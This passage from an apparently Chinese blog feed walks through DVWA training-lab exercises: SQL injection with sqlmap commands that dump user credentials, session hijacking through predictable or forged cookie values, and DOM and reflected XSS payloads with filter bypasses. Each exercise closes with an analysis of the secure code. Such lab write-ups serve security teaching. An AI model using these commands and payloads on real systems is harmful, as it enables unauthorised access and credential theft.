<h3 id="截获数据包"><a href="#截获数据包" class="headerlink" title="截获数据包"></a>截获数据包</h3><p>将截获的数据包复制到文件data.txt中</p>
<p>![image-20201115223004551](/Users/leeyuxun/Library/Application Support/typora-user-images/image-20201115223004551.png)</p>
<h3 id="注入判断-3"><a href="#注入判断-3" class="headerlink" title="注入判断"></a>注入判断</h3><p>输入<code>sqlmap -r data.txt -p id</code>，发现存在SQL注入点id(POST),数据库类型为mysql；-r表示读取文件，-p表示注入参数；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223436.png"></p>
<h3 id="爆破数据库-1"><a href="#爆破数据库-1" class="headerlink" title="爆破数据库"></a>爆破数据库</h3><p>输入<code>sqlmap -r data.txt -p id -dbs</code>，获取数据库；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223610.png"></p>
<h3 id="爆破数据表-1"><a href="#爆破数据表-1" class="headerlink" title="爆破数据表"></a>爆破数据表</h3><p>选择dvwa数据库，输入<code>sqlmap -r data.txt -p id -D dvwa --tables</code>，获取dvwa数据库的数据表；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223751.png"></p>
<h3 id="爆破字段-1"><a href="#爆破字段-1" class="headerlink" title="爆破字段"></a>爆破字段</h3><p>选择users数据表，输入<code>sqlmap -r data.txt -p id -D dvwa -T users --columns</code>，获取users表的字段；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223931.png"></p>
<h3 id="爆破字段内容-1"><a href="#爆破字段内容-1" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h3><p>输入<code>sqlmap -r data.txt -p id -D dvwa -T users -C user,password --dump</code>，爆破user和password字段内容；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115224153.png"></p>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#high.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">'id'</span>])){</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        <span class="variable">$query</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="subst">$id</span>' LIMIT 1;"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span>);</span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)){</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">"first_name"</span>];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">"last_name"</span>];</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: <span class="subst">{$id}</span>&lt;br /&gt;First name: <span class="subst">{$first}</span>&lt;br /&gt;Surname: <span class="subst">{$last}</span>&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);        </span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：加了<code>limit 1</code>限制输出，但是可以直接使用<code>#</code>注释掉，解法与<code>Low Security Level</code>相同。</p>
<p>查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止常规的SQLMap扫描注入测试，因为SQLMap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入；</p>
<p>但是并不代表High级别不能用SQLMap进行注入测试，此时需要利用其非常规的命令联合操作，如：<code>--second-url="xxxurl"</code>（设置二阶响应的结果显示页面的url）</p>
<p>输入<code>sqlmap -r data.txt -p id --second-url="http://localhost/dvwa/vulnerabilities/sqli/index.php"</code>检测是否存在SQL注入，结果如下，存在注入点，后续操作与MEDIUM注入相同；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116113840.png"></p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#impossible.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'Submit'</span>])){</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        <span class="title function_ invoke__">checkToken</span>(<span class="variable">$_REQUEST</span>[<span class="string">'user_token'</span>],<span class="variable">$_SESSION</span>[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Was a number entered?</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>)){</span><br><span class="line">            <span class="comment">// Check the database</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span>);</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">':id'</span>,<span class="variable">$id</span>,PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">            <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>()==<span class="number">1</span>){</span><br><span class="line">                <span class="comment">// Get values</span></span><br><span class="line">                <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">'first_name'</span>];</span><br><span class="line">                <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">'last_name'</span>];</span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: <span class="subst">{$id}</span>&lt;br/&gt;First name: <span class="subst">{$first}</span>&lt;br/&gt;Surname: <span class="subst">{$last}</span>&lt;/pre&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：采用了<code>PDO</code>技术，划清了代码与数据的界限，有效防御 SQL 注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了SQL注入攻击，<code>Anti-CSRFtoken</code> 机制的加入了进一步提高了安全性。</p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>SQL Injection</tag>
        <tag>SQLmap</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA Weak Session IDs</title>
    <url>/DVWA-Weak-Session-IDs.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当用户登录后，在服务器就会创建一个会话(session)，叫做会话控制，接着访问页面的时候就不用登录，只需要携带session去访问。sessionID作为特定用户访问站点所需要的唯一内容。如果能够计算或轻易猜到该sessionID，则攻击者将可以轻易获取访问权限，无需登录直接进入特定用户界面，进而进行其他操作。<span id="more"></span></p>
<p>用户访问服务器的时候，在服务器端会创建一个新的会话(Session)，会话中会保存用户的状态和相关信息，用于标识用户。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个Session，浏览器需要把当前用户持有的SessionID告知服务器。用户拿到session id就会加密后保存到 cookies 上，之后只要cookies随着http请求发送服务器，服务器就知道你是谁了。SessionID一旦在生命周期内被窃取，就等同于账户失窃。</p>
<h2 id="Session利用的实质"><a href="#Session利用的实质" class="headerlink" title="Session利用的实质"></a>Session利用的实质</h2><p>由于SessionID是用户登录之后才持有的唯一认证凭证，因此黑客不需要再攻击登陆过程(比如密码)，就可以轻易获取访问权限，无需登录密码直接进入特定用户界面，进而查找其他漏洞如XSS、文件上传等等。</p>
<p>Session劫持 : 就是一种通过窃取用户SessionID，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持。SessionID还可以保存在URL中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。</p>
<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$html</span> = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) {</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">'last_session_id'</span>])) {</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'last_session_id'</span>] = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">'last_session_id'</span>]++;</span><br><span class="line">        <span class="variable">$cookie_value</span> = <span class="variable">$_SESSION</span>[<span class="string">'last_session_id'</span>];</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">"dvwaSession"</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>在session判断中，如果last_session_id不存在就设置为0，否则就在上次session ID基础上加1.这样是非常脆弱的设置session方法，很容易被利用。</p>
<h2 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h2><p>直接用bp抓包，可以清楚的看到dvwaSesion的cookie，每重放一次，dvwaSesion增加1；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201121202621.png"></p>
<p>使用hackbar构造payload如下，可以直接劫持登录；</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">dvwaSession=10; security=low; PHPSESSID=51qjt8oa8hiudhaaaobgfseaie</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201121202919.png"></p>
<h2 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h2><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$html</span> = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) {</span><br><span class="line">        <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">"dvwaSession"</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>基于时间戳生成dvwaSesion；</p>
<h2 id="攻击测试-1"><a href="#攻击测试-1" class="headerlink" title="攻击测试"></a>攻击测试</h2><p>通过Hackbar中，使用hackbar构造payload如下，把dvwaSession的时间戳调整到现在时间，查看当前时间戳的网站<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dvwaSession=1605962273; security=medium; PHPSESSID=51qjt8oa8hiudhaaaobgfseaie</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201121203932.png"></p>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$html</span> = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) {</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">'last_session_id_high'</span>])) {</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'last_session_id_high'</span>] = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">'last_session_id_high'</span>]++;</span><br><span class="line">        <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">'last_session_id_high'</span>]);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">"dvwaSession"</span>, <span class="variable">$cookie_value</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, <span class="variable">$_SERVER</span>[<span class="string">'HTTP_HOST'</span>], <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对<code>last_session_id_high</code>进行了MD5加密，使用<code>setcookie()</code>函数设置cookie；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">setcookie</span>(name,value,expire,path,domain,secure,httponly)</span><br></pre></td></tr></table></figure>

<p>参数：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>name</td>
<td>必需，规定cookie的名称</td>
</tr>
<tr>
<td>value</td>
<td>必需，规定cookie的值</td>
</tr>
<tr>
<td>expire</td>
<td>可选，规定cookie的有效期</td>
</tr>
<tr>
<td>path</td>
<td>可选，规定cookie的服务器路径</td>
</tr>
<tr>
<td>domain</td>
<td>可选，规定cookie的域名</td>
</tr>
<tr>
<td>secure</td>
<td>可选，规定是否通过安全的HTTPS连接来传输cookie</td>
</tr>
<tr>
<td>Httponly</td>
<td>可选，规定是否Cookie仅可通过HTTP协议访问</td>
</tr>
</tbody></table>
<p>攻击方式与LOW级别基本一致；</p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$html</span> = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) {</span><br><span class="line">        <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">mt_rand</span>() . <span class="title function_ invoke__">time</span>() . <span class="string">"Impossible"</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">"dvwaSession"</span>, <span class="variable">$cookie_value</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, <span class="variable">$_SERVER</span>[<span class="string">'HTTP_HOST'</span>], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><code>$cookie_value</code>采用随机数+时间戳+固定字符串<code>Impossible</code>，再进行sha1运算，理论上不能猜测到dvwaSession的值；</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zhuanlan.zhihu.com/p/108345433">https://zhuanlan.zhihu.com/p/108345433</a></p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>session hijacking</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA XSS (DOM BASED)</title>
    <url>/DVWA-XSS-DOM-BASED.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。<span id="more"></span></p>
<p>DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。</p>
<p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
<p>可能触发DOM型XSS的属性：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.referer 属性</span><br><span class="line">window.name 属性</span><br><span class="line">location 属性</span><br><span class="line">innerHTML 属性</span><br><span class="line">documen.write 属性</span><br></pre></td></tr></table></figure>

<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="comment"># No protections, anything goes</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>无任何保护措施，直接尝试输入<code>?default=&lt;sCriPt&gt;alert(123)&lt;/ScriPt&gt;</code>注入。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201119132354.png"></p>
<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 后端</span><br><span class="line">&lt;?php</span><br><span class="line">    // Is there any input?</span><br><span class="line">    if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {</span><br><span class="line">        $default = $_GET['default']; </span><br><span class="line">        # Do not allow script tags</span><br><span class="line">        if (stripos ($default, "&lt;script") !== false) {</span><br><span class="line">            header ("location: ?default=English");</span><br><span class="line">            exit;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">?&gt; </span><br><span class="line"># 前端</span><br><span class="line">&lt;form name="XSS" method="GET"&gt;</span><br><span class="line">    &lt;select name="default"&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            if (document.location.href.indexOf("default=") &gt;= 0) {</span><br><span class="line">                var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);</span><br><span class="line">                document.write("&lt;option value='" + lang + "'&gt;" + decodeURI(lang) + "&lt;/option&gt;");</span><br><span class="line">                document.write("&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;");</span><br><span class="line">            }</span><br><span class="line">            document.write("&lt;option value='English'&gt;English&lt;/option&gt;");</span><br><span class="line">            document.write("&lt;option value='French'&gt;French&lt;/option&gt;");</span><br><span class="line">            document.write("&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;");</span><br><span class="line">            document.write("&lt;option value='German'&gt;German&lt;/option&gt;");</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">    &lt;input type="submit" value="Select" /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>过滤了<code>&lt;script&gt;</code>标签，可以使用其他标签如<code>IMG</code>过滤；</p>
<p>输入<code>?default=&lt;img src=1 onerror='alert(123)'&gt;</code>，XSS注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201119133653.png"></p>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // Is there any input?</span><br><span class="line">    if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {</span><br><span class="line">        # White list the allowable languages</span><br><span class="line">        switch ($_GET['default']) {</span><br><span class="line">            case "French":</span><br><span class="line">            case "English":</span><br><span class="line">            case "German":</span><br><span class="line">            case "Spanish":</span><br><span class="line">                # ok</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                header ("location: ?default=English");</span><br><span class="line">                exit;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>白名单 只允许 传的 default值 为 French English German Spanish 其中一个</p>
<p>构造攻击语句</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?default=English #<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>写入页面的效果：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">''</span>&gt;</span>English #<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于form表单提交的数据想经过JS过滤所以注释部分的javascript代码不会被传到服务器端(也就符合了白名单的要求)</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201119150810.png"></p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 后端</span><br><span class="line">&lt;?php</span><br><span class="line">		# Don't need to do anything, protction handled on the client side</span><br><span class="line">?&gt; </span><br><span class="line"># 前端</span><br><span class="line">&lt;form name="XSS" method="GET"&gt;</span><br><span class="line">  	&lt;select name="default"&gt;</span><br><span class="line">				&lt;script&gt;</span><br><span class="line">						if (document.location.href.indexOf("default=") &gt;= 0) {</span><br><span class="line">								var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);</span><br><span class="line">								document.write("&lt;option value='" + lang + "'&gt;" + (lang) + "&lt;/option&gt;");</span><br><span class="line">								document.write("&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;");</span><br><span class="line">						}    </span><br><span class="line">						document.write("&lt;option value='English'&gt;English&lt;/option&gt;");</span><br><span class="line">						document.write("&lt;option value='French'&gt;French&lt;/option&gt;");</span><br><span class="line">						document.write("&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;");</span><br><span class="line">						document.write("&lt;option value='German'&gt;German&lt;/option&gt;");</span><br><span class="line">				&lt;/script&gt;</span><br><span class="line">		&lt;/select&gt;</span><br><span class="line">		&lt;input type="submit" value="Select" /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>输入的任何参数都是经过URL编码，然后直接赋值给option标签，不存在XSS漏洞。</p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA XSS (Reflected)</title>
    <url>/DVWA-XSS-Reflected.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>反射型XSS，通过web站点漏洞，向客户端交付恶意脚本代码，这些代码可以被浏览器成功的执行，从而实现对客户端的攻击；</p>
<p>反射型XSS一般可以盗取客户端cookie，将客户端重定向到第三方网站；<span id="more"></span></p>
<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span> (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line">    <span class="comment">// Is there any input?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != <span class="literal">NULL</span> ) {</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：GET后的参数直接打印到HTML页面中，未对输入的内容进行过滤，导致页面中可以执行JS脚本；</p>
<h2 id="XSS攻击测试"><a href="#XSS攻击测试" class="headerlink" title="XSS攻击测试"></a>XSS攻击测试</h2><ol>
<li><p>判断是否存在XSS漏洞</p>
<p> 输入框中输入<code>&lt;Script&gt;alert(123)&lt;/ScrIpt&gt;</code>，弹出弹框，表明存在XSS注入漏洞；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201118000241.png"></p>
<p> 此时已经向页面中写入JS代码；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201118001326.png"></p>
</li>
<li><p>输入<code>&lt;scRIpT&gt;window.location="https://www.baidu.com/"&lt;/ScRipT&gt;</code>，重定向页面到百度首页；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201118001523.png"></p>
</li>
<li><p>输入<code>&lt;sCript&gt;alert(document.cookie)&lt;/scRipt&gt;</code>，弹出cookie数据；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201118002004.png"></p>
</li>
</ol>
<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h3 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span> (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line">    <span class="comment">// Is there any input?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != <span class="literal">NULL</span> ) {</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] );</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello ${name}&lt;/pre&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：GET后的参数直接打印到HTML页面中，只使用str_replace函数过滤了<code>&lt;script&gt;</code>参数，可以进行大小写转换，插入JS脚本；</p>
<h3 id="XSS攻击测试-1"><a href="#XSS攻击测试-1" class="headerlink" title="XSS攻击测试"></a>XSS攻击测试</h3><p>攻击过程与LOW级别相同；</p>
<p>只删除<code>&lt;script&gt;</code>标签的情况是很容易绕过：</p>
<ol>
<li> 使用双写绕过，输入<code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;</code></li>
<li> 使用大小写绕过，输入<code>&lt;sCript&gt;alert(document.cookie)&lt;/script&gt;</code></li>
